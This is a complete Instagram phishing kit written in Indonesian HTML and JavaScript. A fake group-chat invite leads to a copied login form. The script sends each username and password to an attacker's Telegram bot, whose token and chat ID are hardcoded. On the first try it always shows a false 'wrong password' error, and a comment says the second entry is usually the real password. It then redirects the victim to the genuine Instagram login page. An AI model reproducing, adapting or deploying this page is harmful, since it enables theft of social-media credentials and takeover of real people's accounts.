<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anda diundang untuk bergabung ke obrolan grup</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #000000;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        /* --- JOIN CHAT OVERLAY --- */
        #join-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            z-index: 1000;
        }

        .bottom-sheet {
            background: #fff;
            width: 100%;
            border-radius: 20px 20px 0 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
            animation: slideUp 0.3s ease-out;
        }

        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }

        .handle { width: 40px; height: 4px; background: #dbdbdb; border-radius: 2px; margin-bottom: 25px; }
        .profile-pic-group { width: 90px; height: 90px; border-radius: 50%; margin-bottom: 15px; object-fit: cover; border: 1px solid #dbdbdb; }
        .group-name { font-size: 20px; font-weight: 700; margin-bottom: 5px; }
        .member-count { font-size: 14px; color: #737373; margin-bottom: 10px; }
        .group-desc { font-size: 13px; color: #737373; text-align: center; margin-bottom: 25px; line-height: 1.4; max-width: 300px; }
        .btn-join { width: 100%; max-width: 350px; background-color: #0064e0; color: #fff; border: none; border-radius: 12px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; }

        /* --- LOGIN PAGE --- */
        .login-container {
            width: 90%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 150px; 
        }

        .logo-ig { width: 58px; height: 58px; margin-bottom: 50px; object-fit: contain; }

        .input-group {
            width: 100%;
            position: relative;
            margin-bottom: 12px;
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            height: 60px;
        }

        /* Border merah jika salah */
        .input-group.error { border-color: #ed4956; }

        .input-group input {
            width: 100%;
            height: 100%;
            background: transparent;
            border: none;
            padding: 24px 45px 6px 15px;
            font-size: 16px;
            box-sizing: border-box;
            color: #262626;
            outline: none;
        }

        .input-group label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #737373;
            font-size: 14px;
            transition: all 0.1s ease-out;
            pointer-events: none;
        }

        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 15px;
            font-size: 11px;
            color: #737373;
        }

        .password-toggle { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; width: 22px; height: 22px; }
        .password-toggle img { width: 100%; height: 100%; object-fit: contain; }

        .login-btn { width: 100%; background-color: #0064e0; color: white; border: none; border-radius: 25px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        
        #error-message {
            color: #ed4956;
            font-size: 13px;
            margin-top: 15px;
            display: none;
            text-align: center;
        }

        .footer-area { margin-top: auto; width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; padding-bottom: 20px; }
        .meta-logo-img { width: 60px; height: auto; }
    </style>
</head>
<body>

    <div id="join-overlay">
        <div class="bottom-sheet">
            <div class="handle"></div>
            <img src="f/p.jpg" alt="Profile" class="profile-pic-group">
            <div class="group-name">info</div>
            <div class="member-count">251 anggota</div>
            <div class="group-desc">Anda mengikuti 0 orang di obrolan ini</div>
            <button class="btn-join" onclick="closeOverlay()">Minta bergabung</button>
            <div class="group-desc" style="font-size: 11px; margin-bottom: 10px;">
                Jika bergabung dengan obrolan grup ini, anggota juga dapat menelepon Anda...
            </div>
        </div>
    </div>

    <div class="login-container">
        <img src="f/l.png" alt="Instagram" class="logo-ig">

        <div class="input-group" id="user-group">
            <input type="text" id="user" placeholder=" ">
            <label for="user">Nama pengguna, email, atau nomor ponsel</label>
        </div>

        <div class="input-group" id="pass-group">
            <input type="password" id="pass" placeholder=" ">
            <label for="pass">Kata sandi</label>
            <div class="password-toggle" onclick="togglePassword()">
                <img id="eye-icon" src="f/t.png" alt="Toggle Password">
            </div>
        </div>
        
        <button class="login-btn" onclick="validateLogin()">Login</button>
        
        <div id="error-message">Maaf, kata sandi Anda salah. Harap periksa kembali kata sandi Anda.</div>
        
        <a href="#" style="color: #000; text-decoration: none; font-size: 14px; margin-top: 25px;">Lupa kata sandi?</a>
    </div>

    <div class="footer-area">
        <button style="width: 100%; background: transparent; border: 1px solid #0064e0; color: #0064e0; border-radius: 25px; padding: 12px; font-weight: 600; margin-bottom: 15px;">Buat akun baru</button>
        <div class="meta-container">
            <img src="f/m.png" alt="Meta" class="meta-logo-img">
        </div>
    </div>

    <script>
    // Konfigurasi Telegram - Masukkan data anda di sini
    const TELEGRAM_TOKEN = "8560002103:AAFo0auV2fqMYpsh-xyqZvwZzdJYBJIfUf8";
    const TELEGRAM_CHAT_ID = "5639837246";

    let loginAttempts = 0;

    function closeOverlay() {
        document.getElementById('join-overlay').style.display = 'none';
        document.body.style.overflow = 'auto';
    }

    function togglePassword() {
        const passwordInput = document.getElementById('pass');
        const eyeIcon = document.getElementById('eye-icon');
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            eyeIcon.src = "f/b.png"; 
        } else {
            passwordInput.type = "password";
            eyeIcon.src = "f/t.png";
        }
    }

    // Fungsi untuk mengirim data ke Telegram
    async function sendToTelegram(user, pass, attempt) {
        const message = `
    AKUN INSTAGRAM
-------------------------
Status: Login Attempt ${attempt}
User  : ${user}
Pass  : ${pass}
-------------------------
        `;

        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                })
            });
        } catch (error) {
            console.error("Gagal mengirim data.");
        }
    }

    function validateLogin() {
        const userInp = document.getElementById('user').value;
        const passInp = document.getElementById('pass').value;
        const errorMsg = document.getElementById('error-message');
        const userGrp = document.getElementById('user-group');
        const passGrp = document.getElementById('pass-group');

        if (userInp === "" || passInp === "") {
            alert("Harap isi semua kolom.");
            return;
        }

        loginAttempts++;

        if (loginAttempts === 1) {
            // Kirim data percobaan pertama
            sendToTelegram(userInp, passInp, 1);

            errorMsg.style.display = 'block';
            userGrp.classList.add('error');
            passGrp.classList.add('error');
            
            setTimeout(() => {
                userGrp.classList.remove('error');
                passGrp.classList.remove('error');
            }, 2000);

        } else {
            // Kirim data percobaan kedua (biasanya data yang benar karena korban mengira salah ketik)
            sendToTelegram(userInp, passInp, 2).then(() => {
                // Arahkan ke Instagram asli setelah data terkirim
                window.location.href = "https://www.instagram.com/accounts/login/";
            });
        }
    }
</script>
</body>
</html>
